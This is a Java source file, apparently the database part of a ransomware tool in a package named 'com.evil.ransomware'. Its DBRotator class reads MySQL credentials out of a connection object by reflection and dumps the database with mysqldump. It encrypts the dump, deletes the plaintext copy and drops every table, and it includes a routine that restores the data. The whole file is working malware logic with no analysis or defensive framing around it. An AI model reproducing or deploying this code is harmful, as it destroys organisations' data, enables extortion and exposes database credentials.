package com.evil.ransomware;

import com.mysql.jdbc.ConnectionImpl;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.sql.*;
import java.util.Scanner;

public class DBRotator {

    private final Connection conn;
    private ConnectionInfo info;

    public DBRotator(Connection conn) throws Exception {
        this.conn = conn;
        setConnectionInfo();
    }

    private void setConnectionInfo() throws Exception {
        Field f;
        f = ConnectionImpl.class.getDeclaredField("user");
        f.setAccessible(true);
        String username = (String) f.get(conn);

        f = ConnectionImpl.class.getDeclaredField("password");
        f.setAccessible(true);
        String password = (String) f.get(conn);

        f = ConnectionImpl.class.getDeclaredField("host");
        f.setAccessible(true);
        String host = (String) f.get(conn);

        f = ConnectionImpl.class.getDeclaredField("database");
        f.setAccessible(true);
        String database = (String) f.get(conn);

        info = new ConnectionInfo();
        info.setUsername(username);
        info.setPassword(password);
        info.setHost(host);
        info.setDatabase(database);
    }

    public void decryptDatabase(String path) throws Exception {
        String dumpPath = path + "/" + info.getDatabase();
        Cryptor.decrypt(dumpPath + ".enc");
        FileInputStream fis = new FileInputStream(dumpPath);
        importSQL(conn, fis);
        new File(dumpPath + ".enc").delete();
        new File(dumpPath + ".enc.iv").delete();
        new File(dumpPath).delete();
        new File(dumpPath).delete();
    }

    private static void importSQL(Connection conn, InputStream in) throws SQLException {
        Scanner s = new Scanner(in);
        s.useDelimiter("(;(\r)?\n)|(--\n)");
        Statement st = null;
        try {
            st = conn.createStatement();
            while (s.hasNext()) {
                String line = s.next();
                if (line.startsWith("/*!") && line.endsWith("*/")) {
                    int i = line.indexOf(' ');
                    line = line.substring(i + 1, line.length() - " */".length());
                }

                if (line.trim().length() > 0) {
                    st.execute(line);
                }
            }
        } finally {
            if (st != null) st.close();
        }
    }

    public void encryptDatabase(String path) throws Exception {
        File outFile = dumpDatabase(path);
        if (outFile != null) {
            Cryptor.encrypt(outFile.getCanonicalPath());
        }

        // Only uncomment when you're sure it all works
        outFile.delete();

        dropTables();
    }

    private void dropTables() throws SQLException {
        DatabaseMetaData md = conn.getMetaData();
        ResultSet rs = md.getTables(null, null, "%", null);
        while (rs.next()) {
            String tableName = rs.getString(3);
            conn.prepareStatement("DROP TABLE " + tableName).execute();
        }
    }

    private File dumpDatabase(String path) {
        // On tomcat, path is relative to bin
        try {
            File pathDir = new File(path);
            if (!pathDir.exists()) {
                pathDir.mkdirs();
            }

            File outFile = new File(path, info.getDatabase());
            Runtime rt = Runtime.getRuntime();
            PrintStream ps;

            String dumpCommand = "mysqldump " + info.getDatabase() + " -h " + info.getHost() + " -u " + info.getUsername() + " --password=" + info.getPassword();
            Process child = rt.exec(dumpCommand);
            ps = new PrintStream(outFile);
            InputStream in = child.getInputStream();
            int ch;
            while ((ch = in.read()) != -1) {
                ps.write(ch);
//                System.out.write(ch);
            }

            InputStream err = child.getErrorStream();
//            while ((ch = err.read()) != -1) {
//                System.out.write(ch);
//            }

            return outFile;
        } catch (Exception e) {
            System.out.println(e);
            e.printStackTrace();
        }

        return null;
    }

    private class ConnectionInfo {
        private String username;
        private String password;
        private String database;

        public String getHost() {
            return host;
        }

        public void setHost(String host) {
            this.host = host;
        }

        private String host;

        public String getUsername() {
            return username;
        }

        public void setUsername(String username) {
            this.username = username;
        }

        public String getPassword() {
            return password;
        }

        public void setPassword(String password) {
            this.password = password;
        }

        public String getDatabase() {
            return database;
        }

        public void setDatabase(String database) {
            this.database = database;
        }
    }
}
